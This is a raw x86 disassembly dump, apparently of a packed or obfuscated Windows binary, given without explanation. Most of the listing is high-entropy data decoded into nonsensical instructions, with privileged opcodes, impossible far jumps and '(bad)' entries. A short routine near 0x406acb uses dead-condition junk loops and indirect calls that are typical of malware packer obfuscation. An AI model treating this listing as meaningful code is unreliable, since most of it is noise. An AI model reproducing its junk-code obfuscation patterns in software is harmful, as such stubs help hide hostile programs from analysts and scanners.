  406a2e:	sub    DWORD PTR [eax],esp
  406a30:	arpl   WORD PTR ds:0x345ba8b7,ax
  406a36:	and    al,BYTE PTR [edi+0x1f]
  406a39:	mov    esi,0xe101a3d7
  406a3e:	xor    bh,al
  406a40:	inc    esp
  406a41:	xchg   ebx,eax
  406a42:	sub    ah,BYTE PTR [edx+eiz*4+0x48]
  406a46:	jo     0x406a92
  406a48:	scas   al,BYTE PTR es:[edi]
  406a49:	mov    esp,0xab8b384d
  406a4e:	jae    0x406ac1
  406a50:	push   0x8320a07f
  406a55:	repnz outs dx,DWORD PTR ds:[esi]
  406a57:	and    al,0xfe
  406a59:	ss mov cl,cl
  406a5c:	xchg   DWORD PTR [edi+0x49447733],edi
  406a62:	sbb    eax,0xde6ecd15
  406a67:	loope  0x406a05
  406a69:	mov    al,0xc2
  406a6b:	fwait
  406a6c:	scas   eax,DWORD PTR es:[edi]
  406a6d:	stos   DWORD PTR es:[edi],eax
  406a6e:	hlt    
  406a6f:	rcr    esp,cl
  406a71:	adc    dl,0x16
  406a74:	rcl    esi,cl
  406a76:	xchg   edx,eax
  406a77:	jp     0x406a72
  406a79:	sub    esp,DWORD PTR [ebp+0x1a]
  406a7c:	loop   0x406a36
  406a7e:	shl    DWORD PTR [eax],cl
  406a80:	or     eax,DWORD PTR [ecx]
  406a82:	adc    BYTE PTR [edx],bh
  406a84:	test   DWORD PTR [eax],ebp
  406a86:	(bad)  
  406a87:	retf   
  406a88:	jnp    0x406a22
  406a8a:	enter  0x3618,0xef
  406a8e:	mov    eax,0x9d3cf45
  406a93:	je     0x406adf
  406a95:	dec    esp
  406a96:	jmp    0x68bc:0xdf87cfbc
  406a9d:	clc    
  406a9e:	and    DWORD PTR ds:[ebp-0x476266ff],ecx
  406aa5:	(bad)  
  406aa6:	rcl    DWORD PTR [edi+0x95e166e],cl
  406aac:	push   es
  406aad:	ror    bh,0x66
  406ab0:	repz xlat BYTE PTR ds:[ebx]
  406ab2:	xor    eax,0x983e0120
  406ab7:	(bad)  
  406ab8:	in     al,dx
  406ab9:	adc    BYTE PTR [edx+0x64b1aef8],dl
  406abf:	call   0x3272:0x9c05c133
  406ac6:	add    cl,cl
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e77b,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd81,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fd59
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e76f,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fd59
  406b20:	and    esi,DWORD PTR ds:0x42e1a8
  406b26:	mov    DWORD PTR ds:0x42fd59,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e773,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e773,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e773,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e35f
  406b61:	mov    edi,DWORD PTR ds:0x42e773
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e773,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fd71,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fd71,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fd71,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fd7d
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e5bf
  406bad:	mov    edi,DWORD PTR ds:0x42fd71
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fd71,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fd65,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fd65
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fd65,edi
  406bdb:	cmp    DWORD PTR ds:0x42fd65,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fd65,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fd6d
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e4db
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fdf6,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fdf6
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fdf6,edi
  406c22:	cmp    DWORD PTR ds:0x42fdf6,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e787
  406c34:	push   0x42e224
  406c39:	call   DWORD PTR ds:0x42e5c3
  406c3f:	cmp    DWORD PTR ds:0x42fdf6,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fdf6
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fdf6,edi
  406c59:	cmp    DWORD PTR ds:0x42fdf6,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e793,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e78b,0x42fdf6
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x16
  406c9b:	cmp    BYTE PTR [ecx-0x41],cl
  406c9e:	pop    ss
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406c52
  406ca7:	mov    ebp,0x7249188b
  406cac:	mov    al,0xdb
  406cae:	ja     0x406d26
  406cb0:	add    eax,0xf2bea23e
  406cb5:	fiadd  DWORD PTR [edx-0x39]
  406cb8:	cli    
  406cb9:	and    BYTE PTR [ebx],bl
  406cbb:	add    eax,eax
  406cbd:	inc    esi
  406cbe:	jmp    0x406c7f
  406cc0:	cwde   
  406cc1:	pop    ds
  406cc2:	jno    0x406cd1
  406cc4:	adc    BYTE PTR [edx],cl
  406cc6:	das    
  406cc7:	fisubr DWORD PTR [eax]
  406cc9:	mov    esp,0x8c2a8183
  406cce:	jge    0x406c7f
  406cd0:	les    esi,FWORD PTR [esi]
  406cd2:	xchg   edi,eax
  406cd3:	popa   
  406cd4:	aaa    
  406cd5:	cli    
  406cd6:	sub    al,BYTE PTR [edx-0x57849eee]
  406cdc:	sub    dh,bl
  406cde:	push   0x41
  406ce0:	test   BYTE PTR [ebx+0x38073b08],0xd7
  406ce7:	mov    bh,0x60
  406ce9:	cmp    dl,BYTE PTR [edi-0x70]
  406cec:	ds mov esi,0x709f0eeb
  406cf2:	cmp    ecx,eax
  406cf4:	cmp    ebx,esi
  406cf6:	add    DWORD PTR [edx+0x62945dd1],edx
  406cfc:	and    ah,BYTE PTR [edi+0xe]
  406cff:	shr    ah,0x75
  406d02:	xor    eax,0x828eec5b
  406d07:	push   ds
  406d08:	add    eax,0x4e21b91b
  406d0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d0e:	sub    al,0x7
  406d10:	and    edi,edi
  406d12:	push   0x2d03d780
  406d17:	mov    cl,0x84
  406d19:	push   0xfffffff3
  406d1b:	or     BYTE PTR [ebx+0x3463882c],al
  406d21:	int3   
  406d22:	rcr    DWORD PTR [ecx-0x42],1
  406d25:	sbb    al,0x7f
  406d27:	ins    DWORD PTR es:[edi],dx
  406d28:	inc    ebx
  406d29:	pop    ecx
  406d2a:	ins    DWORD PTR es:[edi],dx
  406d2b:	mov    eax,ds:0x3c1952e7
  406d30:	test   DWORD PTR [esp+edi*4],0xac7c7932
  406d37:	int3   
  406d38:	mov    bl,0x52
  406d3a:	cmp    eax,0x5a48c3c5
  406d3f:	push   edx
  406d40:	xor    eax,0x1ed6548f
  406d45:	call   0x679d:0x7b58dcae
  406d4c:	cli    
  406d4d:	pop    edi
  406d4e:	mov    ecx,0xfce86af7
  406d53:	dec    esp
  406d54:	jns    0x406d87
  406d56:	pop    esp
  406d57:	sbb    BYTE PTR [ebx-0x68abb3be],al
  406d5d:	dec    ecx
  406d5e:	dec    edx
  406d5f:	std    
  406d60:	push   esi
  406d61:	jmp    0x8052a281
  406d66:	jp     0x406d29
  406d68:	mov    edi,0xa7768ef1
  406d6d:	mov    eax,edi
  406d6f:	jno    0x406d8c
  406d71:	stos   DWORD PTR es:[edi],eax
  406d72:	push   eax
  406d73:	mov    ebx,0x49542809
  406d78:	push   eax
  406d79:	mov    eax,0xd21fa19d
  406d7e:	fisub  DWORD PTR [esp+eax*1-0x6e]
  406d82:	test   DWORD PTR [ebx],ebx
  406d84:	fadd   QWORD PTR [esi+0x56]
  406d87:	mov    dl,0x2e
  406d89:	inc    ebx
  406d8a:	xor    eax,0x98fd5ca9
  406d8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d90:	in     al,0x4a
  406d92:	cs mov bl,0xbf
  406d95:	pushf  
  406d96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d97:	jnp    0x406d66
  406d99:	push   ebp
  406d9a:	pop    edi
  406d9b:	inc    ebp
  406d9c:	mov    ds:0x1691d4df,eax
  406da1:	jle    0x406d77
  406da3:	add    al,0x48
  406da5:	cmp    DWORD PTR [edx+0x7ac2aa97],eax
  406dab:	sub    cl,BYTE PTR [edi]
  406dad:	out    0x3,eax
  406daf:	sub    BYTE PTR [esi+0x22],ah
  406db2:	jbe    0x406dc0
  406db4:	es gs mov edx,0xfd1f7f98
  406dbb:	test   eax,0x63d8016e
  406dc0:	jmp    0x406dda
  406dc2:	dec    eax
  406dc3:	in     eax,dx
  406dc4:	dec    edx
  406dc5:	mov    esp,esi
  406dc7:	cmp    esi,DWORD PTR [ecx+0x66]
  406dca:	jge    0x406d9d
  406dcc:	ss jg  0x406de6
  406dcf:	push   0x8818a141
  406dd4:	mov    esp,0xdf48ae76
  406dd9:	(bad)  
  406dda:	scas   eax,DWORD PTR es:[edi]
  406ddb:	enter  0xa045,0x9f
  406ddf:	mov    ds:0xb35d230f,al
  406de4:	pop    ebx
  406de5:	jbe    0x406e55
  406de7:	ja     0x406db3
  406de9:	jecxz  0x406e5b
  406deb:	scas   eax,DWORD PTR es:[edi]
  406dec:	sbb    cl,ch
  406dee:	sbb    ebx,DWORD PTR [ebx+0x11]
  406df1:	(bad)  
  406df2:	gs inc esp
  406df4:	push   esp
  406df5:	sbb    cl,ch
  406df7:	clc    
  406df8:	xor    eax,0xa5ff2e5c
  406dfd:	in     al,0x6f
  406dff:	sbb    eax,0xdfc0eac9
  406e04:	mov    dh,0xe4
  406e06:	mov    ch,0xb4
  406e08:	xor    DWORD PTR ds:0xc3fde52c,0xffffffb5
  406e0f:	cwde   
  406e10:	pop    ds
  406e11:	cli    
  406e12:	sbb    al,0x3e
  406e14:	mov    edx,0x3c6ff204
  406e19:	adc    eax,0x1f404638
  406e1e:	shl    BYTE PTR [eax-0x34caf3aa],0x0
  406e25:	push   ss
  406e26:	xor    bh,bl
  406e28:	mov    ds:0x940628d7,al
  406e2d:	push   edx
  406e2e:	dec    esp
  406e2f:	cmp    DWORD PTR [ecx],ebx
  406e31:	jae    0x406e36
  406e33:	mov    cl,dl
  406e35:	dec    esp
  406e36:	jmp    0x71cb:0x5e6f9360
  406e3d:	fcomp  st(3)
  406e3f:	cmp    al,0xbc
  406e41:	popa   
  406e42:	sub    eax,0x438c3971
  406e47:	int3   
  406e48:	and    DWORD PTR [esi-0x7d],ebp
  406e4b:	jns    0x406dd1
  406e4d:	sbb    ah,dh
  406e4f:	scas   eax,DWORD PTR es:[edi]
  406e50:	mul    DWORD PTR [ebp+0x60]
  406e53:	loop   0x406e20
  406e55:	push   ebx
  406e56:	aas    
  406e57:	adc    BYTE PTR [ebx+0x6d],ch
  406e5a:	fs cmp edi,esi
  406e5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e5e:	jg     0x406e3c
  406e60:	inc    eax
  406e61:	lods   al,BYTE PTR ds:[esi]
  406e62:	dec    edi
  406e63:	adc    DWORD PTR [ebx+ecx*2+0x61],edi
  406e67:	stc    
  406e68:	jge    0x406ebb
  406e6a:	int3   
  406e6b:	test   al,0xeb
  406e6d:	mov    ds:0x9ef24adc,al
  406e72:	or     eax,0xab5ee3a3
  406e77:	inc    edx
  406e78:	gs xchg edi,eax
  406e7a:	ja     0x406e09
  406e7c:	fidiv  DWORD PTR [esp+eiz*2-0x5b4b6323]
  406e83:	data16 jmp 0x406ef7
  406e86:	lds    esp,FWORD PTR [eax+0x6dec6ff7]
  406e8c:	jns    0x406e96
  406e8e:	xor    al,0xaa
  406e90:	adc    eax,0x7f59c0f7
  406e95:	xchg   ebp,eax
  406e96:	inc    eax
  406e97:	or     DWORD PTR [edx],edx
  406e99:	ja     0x406eb7
  406e9b:	lock aam 0xf9
  406e9e:	mov    esi,0xe728f2a5
  406ea3:	or     ch,ch
  406ea5:	mov    al,0x84
  406ea7:	mov    edi,ebp
  406ea9:	push   ebp
  406eaa:	jg     0x406ee8
  406eac:	fwait
  406ead:	mov    dh,0xf9
  406eaf:	mov    al,0x7d
  406eb1:	adc    bh,BYTE PTR [edx]
  406eb3:	adc    DWORD PTR [edi],esi
  406eb5:	scas   al,BYTE PTR es:[edi]
  406eb6:	xor    BYTE PTR [esi+ebp*2-0x79],dh
  406eba:	adc    bh,BYTE PTR [eax]
  406ebc:	cmp    BYTE PTR [ebx-0x361d6855],ch
  406ec2:	pusha  
  406ec3:	jle    0x406f15
  406ec5:	iret   
  406ec6:	mov    eax,ds:0x456fda24
  406ecb:	mov    al,ds:0xd4a00814
  406ed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ed1:	jecxz  0x406e70
  406ed3:	(bad)  [esi]
  406ed5:	ror    dl,0x59
  406ed8:	adc    BYTE PTR [esi-0x24],dl
  406edb:	loope  0x406ef1
  406edd:	push   ebp
  406ede:	mov    al,0xf3
  406ee0:	call   0xfd27:0x2a53aecc
  406ee7:	xor    DWORD PTR [ebp-0x5a],0xffffffc1
  406eeb:	xchg   esp,eax
  406eec:	fisub  DWORD PTR [esi]
  406eee:	shl    DWORD PTR [ecx+0x7c19e58],1
  406ef4:	test   al,0xb6
  406ef6:	gs hlt 
  406ef8:	pop    edx
  406ef9:	mov    bh,0x52
  406efb:	les    ebp,FWORD PTR ds:0x7e7610a1
  406f01:	comiss xmm7,DWORD PTR [ebp-0x26]
  406f05:	adc    eax,0x29f85ae1
  406f0a:	cld    
  406f0b:	or     ah,BYTE PTR [ecx+0x212fe8da]
  406f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f12:	call   0xadcdf603
  406f17:	push   ss
  406f18:	test   DWORD PTR [ecx+0x772fd291],eax
  406f1e:	rol    BYTE PTR [ebp-0x67],1
  406f21:	add    edx,DWORD PTR [esi]
  406f23:	lea    edi,[esi-0x51cb2a9a]
  406f29:	std    
  406f2a:	aad    0x6b
  406f2c:	loop   0x406f6c
  406f2e:	(bad)  
  406f2f:	sahf   
  406f30:	daa    
  406f31:	pop    ebp
  406f32:	and    al,0x91
  406f34:	xchg   DWORD PTR [esi],edi
  406f36:	(bad)  
  406f38:	dec    ecx
  406f39:	cmp    BYTE PTR [eax+0x4db759bd],0x1b
  406f40:	and    esp,edi
  406f42:	iret   
  406f43:	sar    BYTE PTR [edi-0x57782a07],0xb7
  406f4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f4b:	enter  0xa576,0x49
  406f4f:	cmp    edi,DWORD PTR ds:0x99e6f9e
  406f55:	jmp    0x88d2:0x19fd7e0
  406f5c:	or     cl,BYTE PTR [eax]
  406f5e:	mov    dl,0xb7
  406f60:	fsubp  st(3),st
  406f62:	test   al,0x2d
  406f64:	xor    dl,cl
  406f66:	add    DWORD PTR [edi+0x13dce2c8],0xdb9f40ac
  406f70:	ret    
  406f71:	jle    0x406fa6
  406f73:	inc    ebx
  406f74:	sahf   
  406f75:	fld    TBYTE PTR [eax-0x4e]
  406f78:	nop
  406f79:	inc    esi
  406f7a:	sar    DWORD PTR [edi+0x4b64ca33],cl
  406f80:	inc    ecx
  406f81:	lahf   
  406f82:	inc    edi
  406f83:	cmp    BYTE PTR [ebx+0x3d32020],dh
  406f89:	xor    al,0xce
  406f8b:	aam    0xd7
  406f8d:	add    DWORD PTR [edx+0x4900afff],esp
  406f93:	outs   dx,DWORD PTR ds:[esi]
  406f94:	sbb    DWORD PTR [ecx-0x1e],ebp
  406f97:	iret   
  406f98:	jg     0x406f20
  406f9a:	or     eax,0x2777983c
  406f9f:	ins    BYTE PTR es:[edi],dx
  406fa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fa1:	push   edi
  406fa2:	in     eax,dx
  406fa3:	jg     0x406f3f
  406fa5:	cs gs push ds
  406fa8:	dec    eax
  406fa9:	(bad)  
  406faa:	js     0x406fe4
  406fac:	ds pusha 
  406fae:	push   ecx
  406faf:	cli    
  406fb0:	cmp    eax,0x9e69642a
  406fb5:	fdivr  st,st(4)
  406fb7:	mov    ch,0x90
  406fb9:	xchg   esi,eax
  406fba:	shl    DWORD PTR [esi+0x408916bb],0xd4
  406fc1:	pop    ecx
  406fc2:	(bad)  
  406fc3:	lds    ebx,FWORD PTR [ebx]
  406fc5:	jmp    0xe333d1f8
  406fca:	addr16 cmc 
  406fcc:	dec    esp
  406fcd:	xchg   ebx,eax
  406fce:	xor    al,0xeb
  406fd0:	repnz inc edx
  406fd2:	jo     0x407012
  406fd4:	mov    ds:0xcc45c72b,al
  406fd9:	xor    DWORD PTR ds:0x1581f89f,eax
  406fdf:	repnz std 
  406fe1:	inc    edx
  406fe2:	add    BYTE PTR [ebx-0x38ffbd19],cl
  406fe8:	inc    ebp
  406fe9:	aam    0xf1
  406feb:	test   DWORD PTR [eax+edi*8-0x2e23ba39],ebx
  406ff2:	test   DWORD PTR [eax+edi*8+0xac05],ebx
  406ff9:	add    cl,ch
  406ffb:	dec    eax
  406ffc:	add    eax,DWORD PTR [eax]
  406ffe:	add    BYTE PTR [esi*2+0x5a51bed1],bl
  407005:	mov    bl,0x71
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [edx+0x5],di
  40700d:	mov    ds:0x70c2c797,eax
  407012:	jo     0x407034
  407014:	jge    0x407086
  407016:	jo     0x407035
  407018:	shr    DWORD PTR [ebx],cl
  40701a:	push   ecx
  40701b:	xchg   ebp,eax
  40701c:	outs   dx,DWORD PTR ds:[esi]
  40701d:	xchg   DWORD PTR [esi+0x73],esi
  407020:	sahf   
  407021:	jmp    0xfa6f68a2
  407026:	cli    
  407027:	into   
  407028:	sub    dh,ch
  40702a:	pop    esi
  40702b:	test   eax,0xaea2da7f
  407030:	(bad)
  407033:	idiv   ebx
  407035:	es stos BYTE PTR es:[edi],al
  407037:	push   ecx
  407038:	lock repnz outs dx,DWORD PTR ds:[esi]
  40703b:	in     eax,dx
  40703c:	clc    
  40703d:	push   ss
  40703e:	repz xchg ecx,esp
  407041:	test   DWORD PTR [eax+0x4e964e7e],edx
  407047:	icebp  
  407048:	loop   0x407078
  40704a:	sbb    al,0x2b
  40704c:	mov    edi,0xe9e525ee
  407051:	mov    dh,0x8d
  407053:	sub    edi,ecx
  407055:	mov    bh,0xcb
  407057:	and    cl,bl
  407059:	push   esi
  40705a:	sub    eax,esp
  40705c:	mov    edi,0x67328af1
  407061:	std    
  407062:	cmp    al,0x33
  407064:	stc    
  407065:	adc    dh,BYTE PTR [esi+0x68fe3f9d]
  40706b:	mov    dl,0xa2
  40706d:	(bad)  
  40706e:	fbstp  TBYTE PTR [esi+0x6e]
  407071:	and    cl,ah
  407073:	ins    BYTE PTR es:[edi],dx
  407074:	popa   
  407075:	xor    edx,DWORD PTR [edi]
  407077:	lods   al,BYTE PTR ds:[esi]
  407078:	repz pop esi
  40707a:	xor    dh,BYTE PTR [edx]
  40707c:	push   edx
  40707d:	jg     0x40701b
  40707f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407081:	cld    
  407082:	push   es
  407083:	sbb    ah,BYTE PTR [ecx]
  407085:	push   0xf895351
  40708a:	cmp    bl,BYTE PTR [esi+0x4f8d70cb]
  407090:	ins    BYTE PTR es:[edi],dx
  407091:	pop    eax
  407092:	jb     0x4070bb
  407094:	mul    BYTE PTR [eax+0x413bf38f]
  40709a:	outs   dx,BYTE PTR ds:[esi]
  40709b:	jns    0x407080
  40709d:	into   
  40709e:	xchg   BYTE PTR [edx+0x6eb25257],ch
  4070a4:	ror    DWORD PTR [edi-0x37],cl
  4070a7:	out    0x6,al
  4070a9:	inc    edx
  4070aa:	or     BYTE PTR [esi-0x33],0xb1
  4070ae:	inc    ebp
  4070af:	and    ebx,DWORD PTR [edi+0x70]
  4070b2:	cwde   
  4070b3:	add    eax,0x9e4b815b
  4070b8:	jb     0x4070f4
  4070ba:	xchg   edi,eax
  4070bb:	push   edx
  4070bc:	jmp    FWORD PTR [edx+0x51]
  4070bf:	into   
  4070c0:	call   DWORD PTR [edi+esi*1+0x65]
  4070c4:	js     0x4070f2
  4070c6:	sbb    ch,BYTE PTR [ebp+esi*1-0x1b]
  4070ca:	push   esp
  4070cb:	mov    edi,0x97b6e00a
  4070d0:	rol    DWORD PTR [edx],0xab
  4070d3:	or     eax,0xb7202e34
  4070d8:	test   dl,al
  4070da:	icebp  
  4070db:	jmp    0x879915a2
  4070e0:	dec    ebx
  4070e1:	imul   cx,si,0xb43f
  4070e6:	cwde   
  4070e7:	dec    edi
  4070e8:	ds pushf 
  4070ea:	aam    0x6b
  4070ec:	pop    eax
  4070ed:	inc    esp
  4070ee:	mov    edx,0x2a9d167a
  4070f3:	hlt    
  4070f4:	push   ebx
  4070f5:	inc    edi
  4070f6:	xchg   ebp,eax
  4070f7:	mov    eax,es
  4070f9:	inc    esi
  4070fa:	push   eax
  4070fb:	sub    eax,0x3b55a709
  407100:	cmc    
  407101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407102:	and    al,0x50
  407104:	cmp    al,0xcb
  407106:	adc    esi,DWORD PTR [ebp+ecx*1+0x6e8f1a26]
  40710d:	sbb    eax,0xaeb49822
  407112:	repnz fldenv [esi+0x30a58ee3]
  407119:	sbb    bl,ch
  40711b:	sahf   
  40711c:	inc    edx
  40711d:	jnp    0x4070fb
  40711f:	leave  
  407120:	dec    edx
  407121:	adc    DWORD PTR [ebx-0x4f],0xffffffaf
  407125:	ins    BYTE PTR es:[edi],dx
  407126:	repz fnstcw WORD PTR [edi+esi*4-0x36]
  40712b:	lahf   
  40712c:	adc    dh,BYTE PTR [edi-0x1ff2a7e0]
  407132:	xor    BYTE PTR [edx+0x5e30a969],bl
  407138:	(bad)
  40713b:	(bad)  
  40713c:	fstp   TBYTE PTR [ecx]
  40713e:	sar    ebx,1
  407140:	in     al,0xee
  407142:	retf   0x8d73
  407145:	mov    edx,0xbd86b81c
  40714a:	sbb    dl,BYTE PTR [ebx]
  40714c:	aaa    
  40714d:	add    DWORD PTR [esi],ebx
  40714f:	test   DWORD PTR [eax],ebp
  407151:	icebp  
  407152:	in     eax,dx
  407153:	add    eax,0x682923b4
  407158:	adc    dh,0x6f
  40715b:	sti    
  40715c:	iret   
  40715d:	mov    ebp,0xba69cadb
  407162:	lods   al,BYTE PTR ds:[esi]
  407163:	mov    ds:0xb29c660e,al
  407168:	cmc    
  407169:	es mov al,bl
  40716c:	mov    esp,0x846f5e0a
  407171:	out    0xbd,eax
  407173:	pop    eax
  407174:	dec    edi
  407175:	dec    edx
  407176:	and    dh,dl
  407178:	mul    DWORD PTR [eax]
  40717a:	mov    edx,0xa5a1d12
  40717f:	not    ch
  407181:	call   0x9017:0xd5322bb8
  407188:	test   al,0xa6
  40718a:	aaa    
  40718b:	add    eax,0x9b9c33d1
  407190:	inc    edx
  407191:	add    DWORD PTR [eax+0x43f0e8c7],ebp
  407197:	sbb    edx,DWORD PTR [eax+eiz*2+0x71bddbdf]
  40719e:	jb     0x4071bb
  4071a0:	(bad)  
  4071a1:	ja     0x4071fd
  4071a3:	ds xchg esi,eax
  4071a5:	push   edi
  4071a6:	test   BYTE PTR [ebp+0x7f],ch
  4071a9:	sti    
  4071aa:	ret    0x5b22
  4071ad:	rcl    DWORD PTR fs:[esi-0x56482327],1
  4071b4:	je     0x4071f5
  4071b6:	fild   DWORD PTR [esi]
  4071b8:	xchg   esp,eax
  4071b9:	bnd ja 0x4071b5
  4071bc:	cmp    ah,BYTE PTR [ebp-0x38]
  4071bf:	daa    
  4071c0:	pushf  
  4071c1:	cwde   
  4071c2:	wrmsr  
  4071c4:	enter  0xfa5e,0xdd
  4071c8:	arpl   WORD PTR [edi+ebp*1+0x1c],di
  4071cc:	jg     0x40719f
  4071ce:	push   ss
  4071cf:	and    eax,0x7bc767e
  4071d4:	push   ebx
  4071d5:	pop    ebx
  4071d6:	adc    eax,0x6d2837ac
  4071db:	outs   dx,DWORD PTR ds:[esi]
  4071dc:	pusha  
  4071dd:	call   0xd1f3:0x6eea22e6
  4071e4:	push   esi
  4071e5:	or     edx,edx
  4071e7:	pop    esp
  4071e8:	xor    eax,0xbc7bc301
  4071ed:	mov    eax,ds:0x6bf69b2d
  4071f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071f3:	iret   
  4071f4:	push   ebp
  4071f5:	pop    ds
  4071f6:	mov    esp,0xe4d7529b
  4071fb:	xchg   ebp,eax
  4071fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071fd:	(bad)  
  4071fe:	jnp    0x4071b9
  407200:	adc    DWORD PTR [edi-0x5],ecx
  407203:	jbe    0x407240
  407205:	gs enter 0x49a1,0xaf
  40720a:	or     eax,0xc77ad2fd
  40720f:	mov    ecx,DWORD PTR [ecx+eiz*2-0x49]
  407213:	push   0xffffff82
  407215:	jge    0x407292
  407217:	xchg   edx,eax
  407218:	leave  
  407219:	enter  0xd760,0x45
  40721d:	out    dx,eax
  40721e:	aad    0x9f
  407220:	mov    ecx,0xd0a8e985
  407225:	fwait
  407226:	inc    eax
  407227:	jge    0x407240
  407229:	imul   edx,DWORD PTR [esi],0xffffff81
  40722c:	add    eax,edx
  40722e:	ja     0x4071ba
  407230:	aaa    
  407231:	push   0xffffff87
  407233:	sbb    BYTE PTR [ecx+0x59],cl
  407236:	jl     0x40725d
  407238:	int3   
  407239:	pusha  
  40723a:	imul   ebx,DWORD PTR [ebx-0xb],0x42
  40723e:	pusha  
  40723f:	and    ch,BYTE PTR [edi-0x6af0b70]
  407245:	fadd   QWORD PTR [ebx-0x6659e824]
  40724b:	xchg   edi,eax
  40724c:	data16 adc bl,BYTE PTR [ecx]
  40724f:	jne    0x407238
  407251:	(bad)  
  407252:	out    dx,eax
  407253:	pop    esp
  407254:	xchg   edx,eax
  407255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407256:	sub    al,BYTE PTR [esi+0x49]
  407259:	pushf  
  40725a:	push   ebp
  40725b:	loope  0x40728a
  40725d:	int3   
  40725e:	loopne 0x4072b3
  407260:	mov    al,al
  407262:	xchg   esp,eax
  407263:	xchg   ecx,eax
  407264:	xchg   ebx,eax
  407265:	mov    WORD PTR [edx-0x63836cbe],es
  40726b:	je     0x407292
  40726d:	sbb    DWORD PTR [ecx+0x4],ebx
  407270:	rol    BYTE PTR [edx+eax*8-0x5fd69d7f],0xb0
  407278:	mov    cl,0xfd
  40727a:	lds    edi,FWORD PTR [eax+esi*2]
  40727d:	add    al,0xe7
  40727f:	in     eax,0xa5
  407281:	push   0xffffffa0
  407283:	push   ebp
  407284:	xchg   DWORD PTR [ecx+0x36],esp
  407287:	xor    edi,edi
  407289:	pop    ebp
  40728a:	and    ah,BYTE PTR [edx+0x6449e06b]
  407290:	pop    ds
  407291:	dec    eax
  407292:	jmp    0x407269
  407294:	push   ebp
  407295:	inc    edi
  407296:	inc    edx
  407297:	ins    BYTE PTR es:[edi],dx
  407298:	push   0x6
  40729a:	sub    edi,DWORD PTR [ebp-0x79]
  40729d:	and    al,0x4b
  40729f:	imul   ebx,DWORD PTR [eax+0x35],0xffffffb2
  4072a3:	jnp    0x4072a5
  4072a5:	fwait
  4072a6:	xchg   edi,eax
  4072a7:	jmp    0x3f03363
  4072ac:	or     BYTE PTR [edx+ecx*1+0x63],dl
  4072b0:	cmp    BYTE PTR [edi],dh
  4072b2:	stos   BYTE PTR es:[edi],al
